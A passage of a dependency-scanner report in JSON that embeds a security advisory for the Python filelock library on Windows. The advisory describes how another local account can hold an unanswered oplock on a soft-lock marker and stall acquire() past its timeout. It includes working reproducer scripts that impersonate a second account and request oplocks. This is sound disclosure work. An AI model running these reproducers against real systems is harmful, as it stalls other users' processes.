None:\n\u003e                 granted_box.append(granted)\n\u003e                 hold.wait()\n\u003e                 return\n\u003e \n\u003e     releasing = threading.Event()\n\u003e     release_durations: list[float] = []\n\u003e \n\u003e     def owner() -\u003e None:\n\u003e         # thread_local locks release only on the acquiring thread, so acquire and release stay on this one\n\u003e         for _ in range(cycles):\n\u003e             lock = FileLock(lock_path, is_singleton=False)\n\u003e             lock.acquire(timeout=5)\n\u003e             started = time.monotonic()\n\u003e             releasing.set()\n\u003e             lock.release()\n\u003e             releasing.clear()\n\u003e             release_durations.append(time.monotonic() - started)\n\u003e             if granted_box:\n\u003e                 return\n\u003e \n\u003e     holder = threading.Thread(target=spinner, daemon=True)\n\u003e     holder.start()\n\u003e     owner_thread = threading.Thread(target=owner, daemon=True)\n\u003e     owner_thread.start()\n\u003e     owner_thread.join(60)\n\u003e     stalled = owner_thread.is_alive() and releasing.is_set()\n\u003e     stop.set()\n\u003e     longest = max(release_durations, default=0.0) * 1000\n\u003e     print(f\"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms\")\n\u003e     if stalled:\n\u003e         print(\"  release() still running after 60 s while the oplock holder has not answered the break\")\n\u003e         if granted_box:\n\u003e             drop(granted_box[0])\n\u003e         owner_thread.join(10)\n\u003e         print(f\"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}\")\n\u003e     return stalled\n\u003e \n\u003e \n\u003e print(\"[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window\")\n\u003e stalled_native = release_under_oplock_requests(\"natural\", os.path.join(base, \"native.lock\"), 500)\n\u003e \n\u003e print(\"[1b] the same, with the window between the handle close and the unlink widened to 200 ms\")\n\u003e \n\u003e \n\u003e def slow_unlink(path: str, *, dir_fd: int | None = None) -\u003e None:\n\u003e     time.sleep(0.2)\n\u003e     real_unlink(path, dir_fd=dir_fd)\n\u003e \n\u003e \n\u003e os.unlink = slow_unlink\n\u003e stalled_scheduled = release_under_oplock_requests(\"scheduled\", os.path.join(base, \"native-scheduled.lock\"), 20)\n\u003e os.unlink = real_unlink\n\u003e \n\u003e print(\"[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\")\n\u003e marker = os.path.join(base, \"soft.lock\")\n\u003e holder = SoftFileLock(marker, is_singleton=False)\n\u003e holder.acquire()\n\u003e holder_fd = holder._context.lock_file_fd  # noqa: SLF001\n\u003e os.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle\n\u003e impersonate_done = threading.Event()\n\u003e granted_soft: list[tuple[int, Overlapped]] = []\n\u003e \n\u003e \n\u003e def take_soft_oplock() -\u003e None:\n\u003e     impersonate()\n\u003e     if (granted := request_level1(marker)) is not None:\n\u003e         granted_soft.append(granted)\n\u003e     impersonate_done.set()\n\u003e     hold.wait()\n\u003e \n\u003e \n\u003e threading.Thread(target=take_soft_oplock, daemon=True).start()\n\u003e impersonate_done.wait(5)\n\u003e print(f\"  oplock granted: {bool(granted_soft)}\")\n\u003e outcome = [\"still running after 25 s\"]\n\u003e \n\u003e \n\u003e def contend() -\u003e None:\n\u003e     started = time.monotonic()\n\u003e     try:\n\u003e         SoftFileLock(marker, is_singleton=False).acquire(timeout=1)\n\u003e         outcome[0] = f\"acquired after {time.monotonic() - started:.2f} s\"\n\u003e     except Timeout:\n\u003e         outcome[0] = f\"Timeout after {time.monotonic() - started:.2f} s\"\n\u003e     except OSError as error:\n\u003e         outcome[0] = f\"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}\"\n\u003e \n\u003e \n\u003e contender = threading.Thread(target=contend, daemon=True)\n\u003e contender.start()\n\u003e contender.join(25)\n\u003e print(f\"  contender: {outcome[0]}\")\n\u003e soft_stalled = \"still running\" in outcome[0]\n\u003e if granted_soft:\n\u003e     drop(granted_soft[0])\n\u003e     contender.join(10)\n\u003e     print(f\"  after the holder closed: {outcome[0]}\")\n\u003e hold.set()\n\u003e print(\"STALLS\" if stalled_native or stalled_scheduled or soft_stalled else \"BOUNDED\")\n\u003e ```\n\u003e \n\u003e Recorded output of section `[2]`:\n\u003e \n\u003e ```\n\u003e [2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\n\u003e   oplock granted: True\n\u003e   contender: Timeout after 10.02 s\n\u003e   after the holder closed: Timeout after 10.02 s\n\u003e ```\n\u003e \n\u003e **`oplock_semantics_vm.py`**\n\u003e \n\u003e ```python\n\u003e \"\"\"\n\u003e Which path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.\n\u003e \n\u003e Run on the VM: C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_semantics_vm.py C:\\\\tmp\\\\rev4F-sem\n\u003e \"\"\"\n\u003e \n\u003e from __future__ import annotations\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import sys\n\u003e import threading\n\u003e import time\n\u003e from ctypes import wintypes\n\u003e \n\u003e base = sys.argv[1]\n\u003e os.makedirs(base, exist_ok=True)\n\u003e kernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\n\u003e kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\n\u003e kernel32.CreateFileW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.HANDLE,\n\u003e ]\n\u003e \n\u003e \n\u003e class Overlapped(ctypes.Structure):\n\u003e     _fields_ = (\n\u003e         (\"Internal\", ctypes.c_void_p),\n\u003e         (\"InternalHigh\", ctypes.c_void_p),\n\u003e         (\"Offset\", wintypes.DWORD),\n\u003e         (\"OffsetHigh\", wintypes.DWORD),\n\u003e         (\"hEvent\", wintypes.HANDLE),\n\u003e     )\n\u003e \n\u003e \n\u003e kernel32.DeviceIoControl.argtypes = [\n\u003e     wintypes.HANDLE,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     ctypes.POINTER(Overlapped),\n\u003e ]\n\u003e kernel32.CloseHandle.argtypes = [wintypes.HANDLE]\n\u003e kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\u003e GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000\n\u003e SHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000\n\u003e INVALID_HANDLE = wintypes.HANDLE(-1).value\n\u003e LEVELS = {\"level1\": 0x00090000, \"batch\": 0x00090008}\n\u003e \n\u003e \n\u003e def take(path: str, level: str) -\u003e tuple[int, Overlapped]:\n\u003e     handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n\u003e     overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n\u003e     pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))\n\u003e     assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()\n\u003e     return handle, overlapped\n\u003e \n\u003e \n\u003e def drop(granted: tuple[int, Overlapped]) -\u003e None:\n\u003e     kernel32.CloseHandle(granted[0])\n\u003e     kernel32.WaitForSingleObject(granted[1].hEvent, 5000)\n\u003e     kernel32.CloseHandle(granted[1].hEvent)\n\u003e \n\u003e \n\u003e def timed(label: str, operation) -\u003e None:  # noqa: ANN001\n\u003e     done = threading.Event()\n\u003e     result = [\"still running after 15 s\"]\n\u003e \n\u003e     def run() -\u003e None:\n\u003e         started = time.monotonic()\n\u003e         try:\n\u003e             operation()\n\u003e             result[0] = f\"returned after {(time.monotonic() - started) * 1000:.1f} ms\"\n\u003e         except OSError as error:\n\u003e             result[0] = f\"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}\"\n\u003e         done.set()\n\u003e \n\u003e     threading.Thread(target=run, daemon=True).start()\n\u003e     done.wait(15)\n\u003e     print(f\"  {label}: {result[0]}\")\n\u003e     return done\n\u003e \n\u003e \n\u003e def open_read(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_RDONLY | os.O_BINARY))\n\u003e \n\u003e \n\u003e def open_write(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_RDWR | os.O_BINARY))\n\u003e \n\u003e \n\u003e def create_new(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))\n\u003e \n\u003e \n\u003e for level in LEVELS:\n\u003e     for label, operation, consumes in (\n\u003e         (\"os.open O_RDONLY\", open_read, False),\n\u003e         (\"os.open O_RDWR\", open_write, False),\n\u003e         (\"os.open O_CREAT|O_EXCL on the existing file\", create_new, False),\n\u003e         (\"os.utime by path\", lambda p: os.utime(p, None), False),\n\u003e         (\"os.rename\", lambda p: os.rename(p, p + \".moved\"), True),\n\u003e         (\"os.unlink\", os.unlink, True),\n\u003e     ):\n\u003e         path = os.path.join(base, f\"{level}-{label.replace(' ', '_').replace('|', '')}.lock\")\n\u003e         with open(path, \"w\", encoding=\"utf-8\") as handle:\n\u003e             handle.write(\"1\\nhost\\n\")\n\u003e         granted = take(path, level)\n\u003e         print(f\"{level}, {label}\")\n\u003e         done = timed(label, lambda p=path, op=operation: op(p))\n\u003e         drop(granted)\n\u003e         done.wait(5)\n\u003e         print(f\"    after the holder closed: {'done' if done.is_set() else 'still running'}\")\n\u003e ```\n\u003e \n\u003e The review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.\n\u003e \n\u003e ## Failure sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as other local account\n\u003e     participant M as soft.lock marker, no handle open\n\u003e     participant L as lock user: SoftFileLock(path).acquire(timeout=1)\n\u003e     participant W as Windows (NTFS)\n\u003e     A-\u003e\u003eW: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)\n\u003e     A-\u003e\u003eW: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged\n\u003e     L-\u003e\u003eW: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once\n\u003e     L-\u003e\u003eW: os.lstat(soft.lock) regular file\n\u003e     rect rgb(255, 214, 214)\n\u003e         L-\u003e\u003eW: os.open(soft.lock, O_RDONLY) inside _read_lock_file\n\u003e         Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted\n\u003e         W--\u003e\u003eL: handle after 10.02 s (two-account run), or when A closes (same-account probe)\n\u003e     end\n\u003e     L-\u003e\u003eL: _check_give_up: past the deadline, raise Timeout after 10.02 s\n\u003e     Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken\n\u003e ```\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls \u003cdir\u003e /inheritance:r /grant:r \"\u003cowner\u003e:(OI)(CI)F\" \"SYSTEM:(OI)(CI)F\" \"Administrators:(OI)(CI)F\"`). `mode` does not do this on Windows.\n\u003e - Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.\n\u003e - No `timeout`, `blocking` or `cancel_check` value bounds the wait.\n\u003e \n\u003e ## Patched version\n\u003e \n\u003e 4.2.1.\n\u003e \n\u003e Fix: https://github.com/tox-dev/filelock/pull/835\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Found by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).\n\u003e \n\u003e - 2026-10-15 23:08 UTC: report received (36 findings; this defect is not among them)\n\u003e - 2026-10-16 01:16 UTC: fix PR #835 opened, for the Linux lease finding of GHSA-7hmp-gf99-57hx\n\u003e - 2026-10-16 08:25 UTC: finding identified in the maintainers' review of PR #835\n\u003e - 2026-10-16 22:43 UTC: draft advisory created\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | filelock | 3.32.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-567q-5qvw-pf92 | filelock | 4.2.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112907\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112907](https://osv.dev/CVE-2026-112907)**.\n\n## [GHSA-567q-5qvw-pf92](https://osv.dev/GHSA-567q-5qvw-pf92)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.\n\u003e \n\u003e Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.\n\u003e \n\u003e ## Severity\n\u003e \n\u003e **CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**\n\u003e \n\u003e `AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.\n\u003e \n\u003e Classification from the review: **security, conditional** on an unheld marker that another account can open.\n\u003e \n\u003e ## Scope and preconditions\n\u003e \n\u003e - Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.\n\u003e - Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.\n\u003e - Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.\n\u003e - Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.\n\u003e - What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.\n\u003e - Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.\n\u003e - Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.\n\u003e \n\u003e ## Introduced\n\u003e \n\u003e [e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) \"feat(soft): detect and break stale locks\" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.\n\u003e \n\u003e A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.\n\u003e \n\u003e ## Reproduction\n\u003e \n\u003e The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.\n\u003e \n\u003e **`oplock_vm.py`**\n\u003e \n\u003e ```python\n\u003e \"\"\"\n\u003e Windows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.\n\u003e \n\u003e Run on the VM (PowerShell, from the synced worktree, with the fltester account present):\n\u003e   C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_vm.py fltester '\u003cpassword\u003e' C:\\\\tmp\\\\rev4F-oplock\n\u003e \n\u003e [1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.\n\u003e     WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the\n\u003e     DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;\n\u003e     [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.\n\u003e [2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the\n\u003e     marker through os.open, which waits for the acknowledgement, past timeout=1.\n\u003e \n\u003e A thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.\n\u003e \"\"\"\n\u003e \n\u003e from __future__ import annotations\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import subprocess\n\u003e import sys\n\u003e import threading\n\u003e import time\n\u003e from ctypes import wintypes\n\u003e \n\u003e from filelock import FileLock, SoftFileLock, Timeout\n\u003e \n\u003e user, password, base = sys.argv[1], sys.argv[2], sys.argv[3]\n\u003e icacls = os.path.join(os.environ[\"SYSTEMROOT\"], \"System32\", \"icacls.exe\")\n\u003e os.makedirs(base, exist_ok=True)\n\u003e subprocess.run([icacls, base, \"/grant\", f\"{user}:(OI)(CI)(M)\"], check=True, capture_output=True)\n\u003e \n\u003e advapi32 = ctypes.WinDLL(\"advapi32\", use_last_error=True)\n\u003e kernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\n\u003e advapi32.LogonUserW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.POINTER(wintypes.HANDLE),\n\u003e ]\n\u003e kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\n\u003e kernel32.CreateFileW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.HANDLE,\n\u003e ]\n\u003e \n\u003e \n\u003e class Overlapped(ctypes.Structure):\n\u003e     _fields_ = (\n\u003e         (\"Internal\", ctypes.c_void_p),\n\u003e         (\"InternalHigh\", ctypes.c_void_p),\n\u003e         (\"Offset\", wintypes.DWORD),\n\u003e         (\"OffsetHigh\", wintypes.DWORD),\n\u003e         (\"hEvent\", wintypes.HANDLE),\n\u003e     )\n\u003e \n\u003e \n\u003e kernel32.DeviceIoControl.argtypes = [\n\u003e     wintypes.HANDLE,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     ctypes.POINTER(Overlapped),\n\u003e ]\n\u003e kernel32.CloseHandle.argtypes = [wintypes.HANDLE]\n\u003e kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\u003e \n\u003e GENERIC_READ = 0x80000000\n\u003e SHARE_ALL = 0x7\n\u003e OPEN_EXISTING = 3\n\u003e FLAG_OVERLAPPED = 0x40000000\n\u003e INVALID_HANDLE = wintypes.HANDLE(-1).value\n\u003e FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000\n\u003e ERROR_IO_PENDING = 997\n\u003e hold = threading.Event()\n\u003e real_unlink = os.unlink\n\u003e \n\u003e \n\u003e def impersonate() -\u003e None:\n\u003e     token = wintypes.HANDLE()\n\u003e     if not advapi32.LogonUserW(user, \".\", password, 3, 0, ctypes.byref(token)):\n\u003e         raise ctypes.WinError(ctypes.get_last_error())\n\u003e     if not advapi32.ImpersonateLoggedOnUser(token):\n\u003e         raise ctypes.WinError(ctypes.get_last_error())\n\u003e \n\u003e \n\u003e def request_level1(path: str) -\u003e tuple[int, Overlapped] | None:\n\u003e     handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n\u003e     if handle == INVALID_HANDLE:\n\u003e         return None\n\u003e     overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n\u003e     if (\n\u003e         not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))\n\u003e         and ctypes.get_last_error() == ERROR_IO_PENDING\n\u003e     ):\n\u003e         return handle, overlapped\n\u003e     kernel32.CloseHandle(handle)\n\u003e     kernel32.CloseHandle(overlapped.hEvent)\n\u003e     return None\n\u003e \n\u003e \n\u003e def drop(granted: tuple[int, Overlapped]) -\u003e None:\n\u003e     handle, overlapped = granted\n\u003e     kernel32.CloseHandle(handle)\n\u003e     kernel32.WaitForSingleObject(overlapped.hEvent, 5000)\n\u003e     kernel32.CloseHandle(overlapped.hEvent)\n\u003e \n\u003e \n\u003e def release_under_oplock_requests(label: str, lock_path: str, cycles: int) -\u003e bool:\n\u003e     stop = threading.Event()\n\u003e     granted_box: list[tuple[int, Overlapped]] = []\n\u003e \n\u003e     def spinner() -\u003e None:\n\u003e         impersonate()\n\u003e         while not stop.is_set():\n\u003e             if (granted := request_level1(lock_path)) is not None:\n\u003e                 granted_box.append(granted)\n\u003e                 hold.wait()\n\u003e                 return\n\u003e \n\u003e     releasing = threading.Event()\n\u003e     release_durations: list[float] = []\n\u003e \n\u003e     def owner() -\u003e None:\n\u003e         # thread_local locks release only on the acquiring thread, so acquire and release stay on this one\n\u003e         for _ in range(cycles):\n\u003e             lock = FileLock(lock_path, is_singleton=False)\n\u003e             lock.acquire(timeout=5)\n\u003e             started = time.monotonic()\n\u003e             releasing.set()\n\u003e             lock.release()\n\u003e             releasing.clear()\n\u003e             release_durations.append(time.monotonic() - started)\n\u003e             if granted_box:\n\u003e                 return\n\u003e \n\u003e     holder = threading.Thread(target=spinner, daemon=True)\n\u003e     holder.start()\n\u003e     owner_thread = threading.Thread(target=owner, daemon=True)\n\u003e     owner_thread.start()\n\u003e     owner_thread.join(60)\n\u003e     stalled = owner_thread.is_alive() and releasing.is_set()\n\u003e     stop.set()\n\u003e     longest = max(release_durations, default=0.0) * 1000\n\u003e     print(f\"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms\")\n\u003e     if stalled:\n\u003e         print(\"  release() still running after 60 s while the oplock holder has not answered the break\")\n\u003e         if granted_box:\n\u003e             drop(granted_box[0])\n\u003e         owner_thread.join(10)\n\u003e         print(f\"  release() returned after the holder closed its handle: {not 